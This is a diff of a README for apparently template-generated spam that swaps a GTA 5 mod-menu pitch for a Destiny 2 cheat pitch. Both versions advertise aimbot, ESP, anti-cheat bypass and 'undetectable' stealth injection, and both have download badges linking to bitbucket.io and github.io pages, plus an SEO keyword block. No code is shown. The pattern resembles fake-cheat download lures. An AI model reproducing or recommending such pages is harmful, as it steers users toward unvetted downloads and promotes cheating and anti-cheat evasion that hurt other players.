@@ -1,24 +1,23 @@
-# 🚗 GTA 5 ModMenu 🔧 Ultimate C++ Trainer & Online Mod Tool
+# 🌌 Destiny 2 Cheat 🔫 C++ Aim, ESP & PvE/PvP Enhancer
 
-Take over Los Santos with this powerful C++-based GTA 5 ModMenu. Packed with premium features like teleportation, infinite health, money drops, weapon spawn, vehicle spawning, and trolling tools, this modmenu works seamlessly in both singleplayer and online sessions. Designed with safety and performance in mind, it includes stealth injection and an intuitive UI to control every aspect of the game.
+Take your Destiny 2 gameplay to god-tier levels with this C++ cheat designed for both PvE and PvP domination. Featuring precision aimbot, ESP for enemies and loot, no recoil, and automated farming features, this tool gives you the power to conquer raids, strikes, and Crucible matches with ease. Optimized for low detection and smooth system performance.
 
-[![Download GTA 5 ModMenu](https://img.shields.io/badge/Download-GTA%205%20ModMenu-blueviolet)](https://offload5.bitbucket.io/)
+[![Download Destiny 2 Cheat](https://img.shields.io/badge/Download-Destiny%202%20Cheat-blueviolet)](https://Destiny-2-Cheat-habo7.github.io/.github)
 
 ## ✨ Key Features
-- 💰 Unlimited Money Drops & RP Modifiers  
-- 🚀 Teleport to Waypoint, Player, or Custom Coordinates  
-- 🛡️ God Mode, No Wanted, Infinite Ammo  
-- 🚗 Vehicle Spawner with Custom Mods  
-- 🧰 Weapon Spawner & Damage Tweaks  
-- 🎮 Player Trolling, Fake Kicks, Explosions, and More  
-- 🕵️ Stealth Injection & Anti-Detection Built-In  
-- 💻 C++ Core for Fast, Stable Performance  
+- 🎯 Smart Aimbot with Aim Assist & Head Prioritization  
+- 👁 Real-Time ESP for Enemies, Loot, and Objectives  
+- 🔫 Recoil & Spread Removal for All Weapons  
+- ⚙️ Auto Farming & AFK XP Systems  
+- 🔄 Custom FOV, Smoothing, and Triggerbot  
+- 🛡️ Anti-Cheat Bypass & Stealth Mode  
+- 💻 Fully Optimized C++ Codebase for Max FPS  
 
 ## 🏆 Why Choose
-This ModMenu combines raw power with smart design—built in C++ for reliable performance and enhanced safety features that reduce detection risk in online lobbies.
+Most Destiny 2 cheats are slow or get detected fast — this one is coded in clean, efficient C++ and built for long sessions with minimal risk.
 
 ## 🚀 Why Use It
-Rule the streets of GTA 5 with god-tier abilities. Whether you're looking to explore creatively, troll friends, or build cash stacks, this menu delivers everything in one place.
+Raid faster, PvP smarter, and farm loot more efficiently. Whether you're grinding solo or with a squad, this cheat gives you the edge in every activity.
 
 ## 🔍 SEO Keywords
-GTA 5 ModMenu, GTA V Trainer, GTA 5 Cheat C++, Online Mod Menu, GTA 5 C++ Hack, GTA Money Drop Tool, Vehicle Spawner GTA, Undetectable GTA 5 Menu, GTA 5 God Mode
+Destiny 2 Cheat, C++ Destiny 2 Hack, Destiny 2 Aimbot, Destiny 2 ESP, PvP Cheat Destiny 2, Destiny 2 Farming Bot, Destiny 2 Undetectable Cheat, Destiny 2 No Recoil Hack
